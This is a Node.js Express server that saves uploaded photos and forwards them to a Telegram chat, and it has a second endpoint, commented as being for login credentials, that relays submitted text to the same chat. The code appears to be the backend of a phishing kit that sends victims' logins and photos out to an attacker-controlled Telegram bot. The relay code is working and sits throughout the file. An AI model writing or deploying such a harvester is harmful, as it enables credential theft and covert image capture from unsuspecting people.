require('dotenv').config();
const express = require('express');
const multer = require('multer');
const fs = require('fs');
const axios = require('axios');
const path = require('path');
const FormData = require('form-data');

const app = express();
const port = process.env.PORT || 3000;
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// JSON parser
app.use(express.json());

// Multer storage
const storage = multer.diskStorage({
  destination: 'uploads/',
  filename: (req, file, cb) => {
    cb(null, Date.now() + path.extname(file.originalname));
  }
});

const upload = multer({ storage: storage });

app.use(express.static('public'));

// Upload PHOTO endpoint
app.post('/upload', upload.single('photo'), async (req, res) => {
  const photoPath = req.file.path;
  console.log('📸 Photo received:', photoPath);
  console.log('➡️ Sending to Telegram...');

  const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;

  try {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', fs.createReadStream(photoPath));

    const response = await axios.post(telegramUrl, formData, {
      headers: formData.getHeaders(),
    });

    console.log('📬 Telegram response:', response.data);

    fs.unlink(photoPath, (err) => {
      if (err) console.error('❌ Failed to delete file:', photoPath, err);
      else console.log('🗑️ Photo deleted:', photoPath);
    });

    res.json({ success: true });
  } catch (error) {
    console.error('❌ Telegram error:', error.response?.data || error.message);

    fs.unlink(photoPath, (err) => {
      if (err) console.error('❌ Failed to delete file:', photoPath, err);
      else console.log('🗑️ Photo deleted:', photoPath);
    });

    res.status(500).json({ success: false });
  }
});

// Upload TEXT endpoint (for login credentials)
app.post('/upload-text', async (req, res) => {
  const { text } = req.body;
  
  if (!text) {
    return res.status(400).json({ success: false, error: 'No text provided' });
  }

  console.log('📝 Text message received:', text);
  console.log('➡️ Sending to Telegram...');

  const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  try {
    const response = await axios.post(telegramUrl, {
      chat_id: CHAT_ID,
      text: text,
      parse_mode: 'HTML'
    });

    console.log('📬 Telegram response:', response.data);
    res.json({ success: true });
  } catch (error) {
    console.error('❌ Telegram error:', error.response?.data || error.message);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Start server
app.listen(port, () => {
  console.log(`🚀 Server running on port ${port}`);
});